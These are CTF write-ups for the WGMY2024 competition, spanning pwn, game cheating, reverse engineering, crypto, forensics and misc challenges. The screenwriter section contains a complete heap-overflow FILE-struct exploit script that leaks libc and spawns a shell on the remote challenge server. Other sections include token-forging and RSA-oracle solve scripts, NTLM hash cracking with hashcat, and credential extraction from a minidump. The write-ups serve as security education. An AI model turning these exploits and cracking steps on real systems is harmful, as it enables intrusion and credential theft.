# WGMY2024

## Table of Contents
- [pwn/screenwriter](#pwnscreenwriter)
- [game/world 1](#gameworld-1)
- [game/world 2](#gameworld-2)
- [rev/stones](#revstones)
- [rev/sudoku](#revsudoku)
- [crypto/rick's algorithm](#cryptorick's-algorithm)
- [crypto/hohoho3](#cryptohohoho3)
- [crypto/hohoho3 continue](#cryptohohoho3-continue)
- [forensic/i cant manipulate people](#forensici-cant-manipulate-people)
- [forensic/oh man](#forensicoh-man)
- [forensic/unwanted meow](#forensicunwanted-meow)
- [misc/the dcm meta](#miscthe-dcm-meta)

## Pwn/Screenwriter

**Challenge Description** : Use our software to craft your next blockbuster hit!

**Challenge Summary** : This challenge involves overwriting the FILE struct to gain arbitrary read and write

**Author** : Ren

<details>
<summary>Source Code</summary>

```c
#include <stdio.h>
#include <stdbool.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

void init(){
    setvbuf(stdin,0,2,0);
    setvbuf(stdout,0,2,0);
    return;
}

void menu(){
    puts("1. Set screenwriter name");
    puts("2. Write script");
    puts("3. View reference");
    puts("4. Exit");
}

int get_choice(){
    char tmp[5] = "";
    printf("Choice: ");
    fgets(tmp,4,stdin);
    return atoi(tmp);
}

void main(){
    init();
    char* name = malloc(0x28);
    FILE *ref_script = fopen("bee-movie.txt","r");
    FILE *own_script = fopen("script.txt","w");
    puts("Welcome to our latest screenwriting program!");
    
    while (true){
        int choice = 0;
        menu();

        switch (get_choice()) {
            case 1:
                printf("What's your name: ");
                read(0,name,0x280);
                break;        

            case 2:
                char own_buf[0x101] = "";
                printf("Your masterpiece: ");
                read(0,own_buf,0x100);
                fwrite(own_buf,1,0x100,own_script);
                break;

            case 3:
                char ref_buf[0x11] = "";
                memset(ref_buf,0,0x11);
                fread(ref_buf,1,0x10,ref_script);
                puts("From the reference:");
                puts(ref_buf);
                break;

            default:
                printf("Goodbye %s",name);
                exit(0);
        }
    }
}
```

</details>

Looking at the source code, we can see an obvious buffer overflow in option 1 which lets us overwrite data in the heap. However, it is not immediately clear what we are suppose to overwrite.

![image](https://github.com/user-attachments/assets/34f34683-5893-4583-8a32-cc9c67c230cc)

Looking at it in gdb, we can see our name chunk with size 0x31 at the top. After that, theres another chunk with size 0x1e1 followed by the value 0xfbad2488. When I saw this value, FSOP immediately came to mind. What is a FILE struct? Lets let @Ren explain 

![image](https://github.com/user-attachments/assets/9614f272-4910-4799-9d79-8f3a70ec1e0d)

You can take a look at the definition in [elixir bootlin](https://elixir.bootlin.com/linux/v6.12.6/source)

<details>
<summary>FILE Struct</summary>

```c
struct _IO_FILE
{
  int _flags;		/* High-order word is _IO_MAGIC; rest is flags. */

  /* The following pointers correspond to the C++ streambuf protocol. */
  char *_IO_read_ptr;	/* Current read pointer */
  char *_IO_read_end;	/* End of get area. */
  char *_IO_read_base;	/* Start of putback+get area. */
  char *_IO_write_base;	/* Start of put area. */
  char *_IO_write_ptr;	/* Current put pointer. */
  char *_IO_write_end;	/* End of put area. */
  char *_IO_buf_base;	/* Start of reserve area. */
  char *_IO_buf_end;	/* End of reserve area. */

  /* The following fields are used to support backing up and undo. */
  char *_IO_save_base; /* Pointer to start of non-current get area. */
  char *_IO_backup_base;  /* Pointer to first valid character of backup area */
  char *_IO_save_end; /* Pointer to end of non-current get area. */

  struct _IO_marker *_markers;

  struct _IO_FILE *_chain;

  int _fileno;
  int _flags2;
  __off_t _old_offset; /* This used to be _offset but it's too small.  */

  /* 1+column number of pbase(); 0 is unknown. */
  unsigned short _cur_column;
  signed char _vtable_offset;
  char _shortbuf[1];

  _IO_lock_t *_lock;
  __off64_t _offset;
  /* Wide character stream stuff.  */
  struct _IO_codecvt *_codecvt;
  struct _IO_wide_data *_wide_data;
  struct _IO_FILE *_freeres_list;
  void *_freeres_buf;
  size_t __pad5;
  int _mode;
  /* Make sure we don't get into trouble again.  */
  char _unused2[15 * sizeof (int) - 4 * sizeof (void *) - sizeof (size_t)];
};
```

</details>

The FILE Struct contains many fields which manage buffering.

### Analysis

![image](https://github.com/user-attachments/assets/03c4a9dd-ef7a-4ef6-a6df-42a5cf45204f)

After using option 3, we can see that the struct is now populated with values.

![image](https://github.com/user-attachments/assets/d9123403-d0ad-450e-b409-864d182c755a)

The contents of the bee script is read into 0x405690 which corresponds to the values in the struct above. Now, our goal will be to overwrite the pointers on the struct to trick it into thinking theres a buffer located somewhere else. Then we will use option 3 to leak this value. Our target will be the GOT entry of puts()

```
GOT protection: Full RelRO | GOT functions: 13

[0x403f88] puts@GLIBC_2.2.5  →  0x7ffff7c80ed0
```

```py
payload = b"A" * 0x28
payload += p64(0x1e1)
payload += p64(0xfbad2488)
payload += p64(0x403f88)
payload += p64(0x404f88)
payload += p64(0x403f88) * 5
payload += p64(0x404f88)
```

![image](https://github.com/user-attachments/assets/32f89dfc-24e7-4817-abcd-78f7ad8980bd)

Now that we know where is libc, maybe we can spawn a shell on the server. To do that, we need to be able to freely write anywhere in memory. Luckily for us, there is a 2nd file struct which lets us write data. Now, we should overwrite the struct fields to trick libc into thinking that the buffer is located somewhere else. But where should we write to? I used [angry-FSROP](https://blog.kylebot.net/2022/10/22/angry-FSROP/) to spawn shell on server. 

### Getting Arbitrary Write

```py
payload = b"A" * (0x198 + 0x70)
payload += p64(0x1e1)
payload += p64(0xfbad2c84)
payload += p64(stdout) 
payload += p64(0x0) * 5
payload += p64(stdout)
payload += p64(stdout + 0x1000)
```

![image](https://github.com/user-attachments/assets/52214079-50ad-4ed1-92da-b9907e244482)

Now, the buffer for our write is located at `_IO_2_1_stdout_`. The next thing to do would be to overwrite stdout with our fake file struct.

```py
fake = FileStructure(0)
fake.flags = 0x3b01010101010101
fake._IO_read_end=libc.sym['system']
fake._IO_save_base = gadget
fake._IO_write_end=u64(b'/bin/sh\x00')
fake._lock=stdout_lock
fake._codecvt= stdout + 0xb8
fake._wide_data = stdout+0x200
fake.unknown2=p64(0)*2+p64(stdout+0x20)+p64(0)*3+p64(fake_vtable)
```

![image](https://github.com/user-attachments/assets/ed3c8a0d-a18c-4f47-aca7-60b5718e81c0)

<details>
<summary>Solve Script</summary>

```py
#!/usr/bin/python
from pwn import *
import warnings
import time

warnings.filterwarnings("ignore",category=BytesWarning)

exe = context.binary = ELF('./chall_patched')
libc = exe.libc

host = "43.216.119.115"
port = 32782

gdb_script = '''

'''

r = lambda x: p.recv(x)
rl = lambda: p.recvline(keepends=False)
ru = lambda x: p.recvuntil(x, drop=True)
cl = lambda: p.clean(timeout=1)
s = lambda x: p.send(x)
sa = lambda x, y: p.sendafter(x, y)
sl = lambda x: p.sendline(x)
sla = lambda x, y: p.sendlineafter(x, y)
ia = lambda: p.interactive()
li = lambda s: log.info(s)
ls = lambda s: log.success(s)

def debug():
  gdb.attach(p)
  p.interactive()

# p = exe.process()
p = remote(host,port)
#p = gdb.debug('./', gdbscript = gdb_script)

sla(b"Choice: ", "3")

payload = b"A" * 0x28
payload += p64(0x1e1)
payload += p64(0xfbad2488)
payload += p64(0x403f88)
payload += p64(0x404f88)
payload += p64(0x403f88) * 5
payload += p64(0x404f88)

sla(b"Choice: ", "1")
s(payload)
sla(b"Choice: ", "3")

ru(b"reference:\n")
libc.address = u64(rl() + b"\x00\x00") - (0x7f9149c80ed0 - 0x00007f9149c00000)
environ = libc.sym["environ"]
li(f"Libc base @ {hex(libc.address)}")

stdout_lock = libc.address + 0x21ba70
stdout = libc.sym['_IO_2_1_stdout_']
fake_vtable = libc.sym['_IO_wfile_jumps']-0x18
gadget = libc.address + 0x0000000000163830

payload = b"A" * (0x198 + 0x70)
payload += p64(0x1e1)
payload += p64(0xfbad2c84)
payload += p64(stdout) 
payload += p64(0x0) * 5
payload += p64(stdout)
payload += p64(stdout + 0x1000)

print(hex(len(payload)))
sla(b"Choice: ", "1")
s(payload)

fake = FileStructure(0)
fake.flags = 0x3b01010101010101
fake._IO_read_end=libc.sym['system']
fake._IO_save_base = gadget
fake._IO_write_end=u64(b'/bin/sh\x00')
fake._lock=stdout_lock
fake._codecvt= stdout + 0xb8
fake._wide_data = stdout+0x200
fake.unknown2=p64(0)*2+p64(stdout+0x20)+p64(0)*3+p64(fake_vtable)

print(hex(len(bytes(fake))))
sla(b"Choice: ", "2")
s(bytes(fake))

# debug()

p.interactive()
```

</details>

### Side Note

There are multiple ways to solve this challenge, potentially overwriting the return address of read() or overwriting the exit functions handler with a one gadget. I tried both but it didnt work for me so I guess its a skill issue. Though, I was very satisfied with this because its my first time solving a FSOP challenge after reading writeups about it.

## Game/World 1

When saving the game, we get a RMMZSave file which we can edit using this [Save Edit](https://www.saveeditonline.com/)

![image](https://github.com/user-attachments/assets/dcad718c-1093-455f-9ccf-97b2d4f7ccff)

Then, just play the game and one shot the bosses to get all the flag. Flag 1, 2 and 3 is obtainable by killing the boss. Flag 4 can be obtained by killing the lava world boss and walking back out. The flag is written on the floor. The final flag is obtained by unlocking the chest and entering the password "wgmy". Hints about the password is given as "23 7 13 25".

## Game/World 2

Open the apk in APKLab and look for interesting things. One thing I found was the Enemies.json

![image](https://github.com/user-attachments/assets/1129c465-dc52-4921-a649-cdac2b4fed99)

`"params":[600,0,20,20,20,20,20,20]`

I assumed the params are the stats of the monster and just modified the biggest number (assuming to be HP) to 1. Then, recompile the APK and sign it. Then install the game in BlueStacks and play through the game to get all the flags. Flags are obtained in the same way as World 1

## Rev/Stones

Running strings on the file shows that its a python executable

![image](https://github.com/user-attachments/assets/bc14c56f-1ed3-41df-8970-2fe9d6a13a7b)

Use [pyinstxtractor](https://github.com/extremecoders-re/pyinstxtractor) on the exe.

<details>
<summary>Extracted</summary>

```py

```py
# Source Generated with Decompyle++
# File: CHAL-stones.pyc (Python 3.10)

import requests
from datetime import datetime
from urllib.request import urlopen
from datetime import datetime
server_url = 'http://3.142.133.106:8000'
current_time = urlopen('http://just-the-time.appspot.com/')
current_time = current_time.read().strip()
current_time = current_time.decode('utf-8')
current_date = current_time.split(' ')[0]
local_date = datetime.now().strftime('%Y-%m-%d')
# print(current_date)
# print(local_date)
if current_date == local_date:
    print("We're gonna need a really big brain; bigger than his?")
first_flag = 'WGMY{1d2993'
user_date = current_date
params = {
    'first_flag': first_flag,
    'date': user_date }
response = requests.get(server_url, params, **('params',))
if response.status_code == 200:
    print(response.json()['flag'])
#     return None
# None(response.json()['error'])
```

</details>

From the challenge description, theres a `/flag` endpoint on the server so just navigate to `http://3.142.133.106:8000/flag` and the server will respond with a YouTube video link. Send a get request to `http://3.142.133.106:8000` with the date set to the upload date of the YouTube video will give us the flag.

## Rev/Sudoku

Once again, another python executable. Just use pyinstxtractor and pycdc to get the original code back

<details>
<summary>Extracted</summary>

```py

```py
# Source Generated with Decompyle++
# File: sudoku.pyc (Python 3.11)

import random
alphabet = 'abcdelmnopqrstuvwxyz1234567890.'
plaintext = '0 t.e1 qu.c.2 brown3 .ox4 .umps5 over6 t.e7 lazy8 do.9, w.my{[REDACTED]}'

def makeKey(alphabet):
    alphabet = list(alphabet)
    random.shuffle(alphabet)
    return ''.join(alphabet)

key = makeKey(alphabet)

def encrypt(plaintext, key, alphabet):
    pass
# WARNING: Decompyle incomplete

enc = encrypt(plaintext, key, alphabet)
```

</details>

### Solve

<details>
<summary>Solve Script</summary>

```py

```py
plaintext = '0 t.e1 qu.c.2 brown3 .ox4 .umps5 over6 t.e7 lazy8 do.9, w.my'
anotherrr = 'z v7o1 an7570 9d.tl3 7.4b 7n2pws .qodx v7oc ye68u m.7r, t728'

# Function to create a mapping from plaintext to anotherr
def create_mapping(plaintext, anotherr):
    # Initialize an empty dictionary to store the character mapping
    char_mapping = {}

    # Iterate over the characters in both strings
    for p_char, a_char in zip(plaintext, anotherr):
        if p_char != ' ' and a_char != ' ':  # Ignore spaces
            char_mapping[p_char] = a_char
    
    return char_mapping

# Create the mapping
mapping = create_mapping(plaintext, anotherrr)
encrypted_message = "t728{09er1bzbs9sx5sosu7719besr39zscbx}"

# Print the character mapping
# print("Character Mapping:")
i = 0
flag = ""
        
print(mapping)

for i in range(len(encrypted_message)):
    for p_char, a_char in mapping.items():
        if a_char == encrypted_message[i]:
            flag += p_char
print(flag)
```
</details>


![image](https://github.com/user-attachments/assets/605fcf21-3a9d-47d3-93f4-cc8227503e88)

Our output is `w.my2ba914045b56c5e58..1b4a593b05746` but since we know the flag format and we know that the hash is hex values, we can just fix the flag to `wgmy{2ba914045b56c5e58ff1b4a593b05746}`

## Crypto/Rick's Algorithm

To bypass c % pow(flag,e,n) we need to add n onto the ciphertext and then to bypass flag % pow(c,d,n), we can just multiply 2**e to the ciphertext. Now send it to the server which it will decrypt for us and we will get the flag in the form of 2m so divide 2 and we will get the flag.

<details>
<summary>Solve Script</summary>

```py
from pwn import
from Crypto.Util.number import *
import gmpy2

io = remote('43.216.11.94',32804)
io.recvuntil(b"Enter option: ")
io.sendline(b'3')
io.recvuntil(b'flag: ')
enc = int(io.recvline().decode().strip('\n'))
e = 0x557

numbers_bytes = [b'\x03',b'\x04',b'\x05',b'\x06']
numbers = [3,4,5,6]
ciphers = []
diffs = []
for i in range(4):
    io.recvuntil(b'Enter option: ')
    io.sendline(b'1')
    io.recvuntil(b'Enter message to encrypt: ')
    io.sendline(numbers_bytes[i])
    io.recvuntil(b'Encrypted message: ')
    cipher = int(io.recvline().strip().decode())
    ciphers.append(cipher)
    diffs.append(pow(numbers[i], e) - cipher)

common_factor = None
for diff in diffs:
    if common_factor is None:
        common_factor = diff
    else:
        common_factor = gmpy2.gcd(common_factor, diff)
print(common_factor) 
print(ciphers[0] == pow(3, e, common_factor))
io.recvuntil(b"Enter option: ")
io.sendline(b'2')
newenc = (pow(2,e)*enc)+common_factor
io.recvuntil(b"Enter ciphertext to decrypt: ")
io.sendline(str(newenc).encode())
io.recvuntil(b'Decrypted message: ')
flag = int(io.recvline().strip().decode())
print(long_to_bytes(flag//2))
```

</details>

## Crypto/Hohoho3

Basically it checks the lsb of our (crc xor name) and only xor with m if it's 1 
that means if we send 127
we will be skipping 7 iterations of this xor operation
only the right shift is applied every iteration which we can still calculate
at the 8th iteration we let it xor with m cuz now we know our token and crc value
meaning m can be calculated by xoring the other two values

<details>
<summary>Solve Script</summary>

```py
from pwn import *
import itertools
from binascii import unhexlify, hexlify

io = remote("43.216.11.94", 33891)

io.recvuntil(b"Enter option: ")
io.sendline(b'1')
io.recvuntil(b"Enter your name: ")
#io.interactive()
io.sendline(chr(127).encode())
io.recvuntil(b"Use this token to login: ")
token = io.recvline().decode().strip('\n') 
toget = int.from_bytes(bytes.fromhex(token)) ^ ((1 << 128) - 1)
m = ((1 << 120) - 1) ^ toget
print(m)

def generateToken(name):
    data = name.encode(errors="surrogateescape")
    crc = (1 << 128) - 1
    for b in data:
        crc ^= b
        for _ in range(8):
            crc = (crc >> 1) ^ (m & -(crc & 1))
    
    return hex(crc ^ ((1 << 128) - 1))[2:]

forge = generateToken("Santa Claus")
io.recvuntil(b"Enter option: ")
io.sendline(b'2')
io.recvuntil(b"Enter your name: ")
io.sendline(b'Santa Claus')
io.recvuntil(b"Enter your token: ")
io.sendline(forge.encode())
io.recvuntil(b"Enter option: ")
io.sendline(b'4')
print(io.recvline().decode().strip('\n'))
print(io.recvline().decode().strip('\n'))
```

</details>

## Crypto/Hohoho3 Continue

We can reuse the script from Hohoho3 to solve this too.

<details>
<summary>Solve Script</summary>

```py
from pwn import *
import itertools
from binascii import unhexlify, hexlify

io = remote("43.216.11.94", 33891)

io.recvuntil(b"Enter option: ")
io.sendline(b'1')
io.recvuntil(b"Enter your name: ")
#io.interactive()
io.sendline(chr(127).encode())
io.recvuntil(b"Use this token to login: ")
token = io.recvline().decode().strip('\n') 
toget = int.from_bytes(bytes.fromhex(token)) ^ ((1 << 128) - 1)
m = ((1 << 120) - 1) ^ toget
print(m)

def generateToken(name):
    data = name.encode(errors="surrogateescape")
    crc = (1 << 128) - 1
    for b in data:
        crc ^= b
        for _ in range(8):
            crc = (crc >> 1) ^ (m & -(crc & 1))
    
    return hex(crc ^ ((1 << 128) - 1))[2:]

forge = generateToken("Santa Claus")
io.recvuntil(b"Enter option: ")
io.sendline(b'2')
io.recvuntil(b"Enter your name: ")
io.sendline(b'Santa Claus')
io.recvuntil(b"Enter your token: ")
io.sendline(forge.encode())
io.recvuntil(b"Enter option: ")
io.sendline(b'4')
print(io.recvline().decode().strip('\n'))
print(io.recvline().decode().strip('\n'))
```

</details>

## Forensic/I Cant Manipulate People

The challenge is about network analysis and they provided us with a pcap file called traffic.pcap. Therefore, I used Wireshark to further analyze the traffic, and I observed that there are multiple ICMP protocol that are being sent as ping requests, so I checked out the packets. 

![image](https://github.com/user-attachments/assets/472fa7aa-53ac-4f39-8d61-bdfeab4edacc)

Inside the first ICMP packet, I was able to observe that the last byte of the data was a readable ASCII character, so I continued to look at the other ICMP packets based on their sequence

![image](https://github.com/user-attachments/assets/7ee6f2b4-2dbe-44e4-8f4b-1f89f1f5e96f)

It seems that the last byte of the ICMP packets are printing an ASCII character that resembles the flag format of the competition which is `WGMY{flag}`

![image](https://github.com/user-attachments/assets/fa491769-59f9-4cec-8e25-00af606db4b9)

Retrieving the characters manually could be time consuming and there is a high possibility of human errors so I create a simple python script that will retrieve every single last byte of the ICMP packets and convert them into readable ASCII characters using scapy. By running the script, we will be able to retrieve the entire flag.

![image](https://github.com/user-attachments/assets/777316f9-dd5c-4b9d-a42e-7971eabb7eaa)

> Flag: WGMY{1e3b71d57e466ab71b43c2641a4b34f4}

## Forensic/Oh Man

The challenge is related to network analysis and it provided us with a file called wgmy-ohman.pcapng. My initial analysis was to use Wireshark to inspect the packets and analyze the traffic. We can see that there are multiple encrypted SMB3 packets, and it requires us to decrypt to further investigate the traffic. Fortunately, we can simply decrypt the packets using NTLM hashes.

![image](https://github.com/user-attachments/assets/5a1d600b-5c6e-4559-94c7-8cb460104da8)

We can gather the NTLM hashes information from the SMB2 protocol starting from the challenge packet.

![image](https://github.com/user-attachments/assets/f42c8e93-c59c-46f2-8962-c497d5e1367a)

After successfully gathering all the relevant NTLM hashes, it should look something like this

![image](https://github.com/user-attachments/assets/994d8fc3-c44e-4a5b-9a6b-9205badfa1ee)

Now we need to convert them into hashcat readable format and then use hashcat to brute force the NTLMSSP password using the rockyou.txt wordlist.

![image](https://github.com/user-attachments/assets/7c217785-a758-4e33-8249-e32bc46a09f1)

After a moment, hashcat should be able to find the correct password which is password<3. Then, we can decrypt the SMB3 encrypted traffic by using Wireshark and placing the password into the NTLMSSP protocol. The SMB3 traffic should be decrypted now, and we can use the export objects function to obtain the files used in the traffic. One of the files called ‘RxHmEj’ contains information on how to restore the corrupted log.

![image](https://github.com/user-attachments/assets/f9d9a3a5-5b66-4144-b9a3-351994497523)

I simply created a python script that will restore the minidump by correcting its signature. After that, I used pypykatz minidump feature to extract the credentials from the log.

![image](https://github.com/user-attachments/assets/345db230-2571-42df-979d-4314207d9b72)

After dumping all the extracted credentials, we can retrieve the flag from one of the passwords

![image](https://github.com/user-attachments/assets/7f844dbb-1615-4286-8d39-edbf88037aee)

> Flag: wgmy{fbba48bee397414246f864fe4d2925e4}

## Forensic/Unwanted Meow

The challenge provided us with a corrupted JPEG file called flag.shredded and my initial analysis was to check the headers of the image to ensure that the image is in correct signature format.

![image](https://github.com/user-attachments/assets/0f1e1350-9265-4cf5-b205-8c410ce6b2c8)

By using xxd, it seems the hex headers of the image are in correct signature format, so I further analyze the image. Eventually, I found out that there are weird ‘meow’ strings contained inside the data of the image.

![image](https://github.com/user-attachments/assets/a3ae8afa-6a68-4710-afb7-a8c3e042cbad)

By removing all the ‘meow’ strings from the image data using hex editor, the correct image will be formed, and we will be able to retrieve the flag.

![image](https://github.com/user-attachments/assets/e1a434c4-f520-4725-9b59-26de5859b272)

> Flag: WGMY{4a4be40c96ac6314e91d93f38043a634}

## Misc/The DCM Meta

The challenge provided us with a Dicom file and upon opening the file with a text editor, we can see that there are random ASCII characters along with the flag format WGMY contain inside the file

![image](https://github.com/user-attachments/assets/2bad2de9-286d-4aa0-ab89-e92cbd9a2cd5)

The challenge description provided us with some sort of indices that could represents the index of each ASCII characters inside the Dicom file. Therefore, I create a simple python script to rearrange their orders based on the provided indices. By running the python script, we will obtain the flag.

![image](https://github.com/user-attachments/assets/06496e26-fd07-4b96-9a08-f343c78e8b18)

> Flag: WGMY{51fadeb6cc77504db336850d53623177}
